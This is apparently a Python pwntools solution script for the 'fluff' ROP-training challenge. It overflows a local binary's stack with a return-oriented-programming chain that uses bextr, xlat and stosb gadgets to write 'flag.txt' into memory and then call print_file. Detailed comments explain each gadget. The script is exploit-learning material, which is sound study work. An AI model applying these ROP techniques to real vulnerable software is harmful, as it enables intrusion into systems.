#!/usr/bin/env python3
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

pop_rdi = p64(0x004006a3) # Very handy as we will lean heavily on a STOSB RDI, AL gadget.
data_section = p64(0x00601028) # The place where we will write "flag.txt"
print_flag = p64(0x00400510) # The function to call that calls the print flag. Technically this is the print_file function.


def write_what_where(what, where):
    """
    This function is kinda wild but chains together several gadgets to effectively create a 
    mov [reg], reg. Gadget.

    First up us the gadget: POP rdx; pop rcx; add rcx, 0x3ef2; bextr rbx,rcx,rdx;
    I'll leave it to the reader to fully understand the bextr function, but we use it to get
    all bits of RCX into RBX. We will also use this gadget to clear RAX to 0, as we can't
    predict that it'll be anything else.

    Note -- the add  rcx, 0x3ef2 is just an annoyance, as we're passing in an entire memory address
    to ecx, we simply account for this by subtracting 0x3ef2 from the address we're passing in
    as adding it will just get us to the address we really want anyways.

    Essentially we use this function to turn RBX into a pointer to a character that we want somewhere
    in memory to ultimatly create the string 'flag.txt'.

    This RBX pointer is then passed to the next gadget: xlat rbx; ret; This will dereference RBX, 
    with an offset of AL (why it has to be zero, at least to begin) and put that value back in to AL.

    Now that we have a letter in AL, we can simply use the gadget: stosb rdi; ret To write the
    letter to the next byte in rdi, which will point to our data section. As stosb increments
    automatically, we don't have to ever load rdi again until we are ready to actually call
    print_file.

    One point of note -- We could use only the EBX portion of the xlat instruction with AL being zero
    every time, by xlat'ing on the data portion with each iteration. However, this has the negative
    effect of our rop chain being too long (we only have 512 bytes). To solve this issue we further adjust
    the location we XLAT by the previous letter's character value to account for AL being that value. This 
    means our final formula is [address - 0x3ef2 - previous_letter]. This offset will always xlat to the next
    letter.

    """
    bextr_gadget = p64(0x0040062a)
    
    xlat_gadget = p64(0x00400628)
    storsb_gadget = p64(0x00400639)

    # Used to identify what the value of the previous letter should be
    filename = "flag.txt"
    # The offsets into the binary where the letters we want exist.
    indexes = [0x004003c4, 0x004003c1, 0x004003cd + 9, 0x004003cd + 2, 0x004003c9, 0x004003cd + 11, 0x00400238 + 14, 0x004003cd + 11]

    # Get the data section where we will write the data into RDI. We 
    # only have to do this once, thank goodness.
    rop = b""
    rop += pop_rdi
    rop += data_section
    

    # Clear AL once, in the future we will calculate this based on the 
    # previous letter as described above.
    rop += bextr_gadget
    # You'll see this value a lot so I may as well explain it
    # the 3f requests 63 bits from the source register, and the 00 means start at bit 0. Think of this
    # as a "substring" for a register. I'll leave you to learn more about bextr on your own.
    rop += p64(0x3f00)
    rop += p64(u64(data_section) - 0x3ef2)
    rop += xlat_gadget

    # Loop over each letter's offset
    for x in range(len(indexes)):
        # Figure out how we need to adjust based on AL's previous value for the XLAT call.
        if x == 0:
            last_letter = 0
        else:
            last_letter = ord(filename[x-1])

        rop += bextr_gadget
        rop += p64(0x3f00)
        rop += p64(indexes[x] - 0x3ef2 - last_letter)

        # Translate the address / offset into a character placed in AL
        rop += xlat_gadget
        # Store AL into wherever RDI points (data section).
        rop += storsb_gadget

    return rop


gen = cyclic_gen()

# Filler
data = gen.get(40)

# Generate the bulk of our chain.
data += write_what_where(0x3, 5)

# Put the data section into RDI as the first and only parameter to print_file().
data += pop_rdi
data += data_section

# Call print_file.
data += print_flag

p = process("./fluff")

# Eat all the output
p.readuntil(b"> ")

# Send the chain
p.sendline(data)

# Go interactive.
p.interactive()
